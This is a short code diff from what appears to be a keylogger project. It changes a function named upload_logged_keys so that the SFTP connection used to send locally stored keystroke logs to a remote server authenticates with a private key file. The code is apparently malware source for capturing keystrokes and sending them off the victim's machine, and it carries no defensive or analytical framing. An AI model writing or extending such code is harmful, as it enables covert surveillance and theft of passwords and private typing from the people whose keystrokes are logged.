@@ -19,7 +19,7 @@ def write_key_to_file(key):
 
 def upload_logged_keys():
     logging.info('uploading logged keys')
-    _sftp_server = sftp_server()
+    _sftp_server = sftp_server(private_key=config.id_rsa_path)
     remote_dir = "/".join([config.remote_dir, config.remote_keylogs_dir])
     _sftp_server.chdir(remote_dir)
     files = os.listdir(config.local_keylogs_dir)
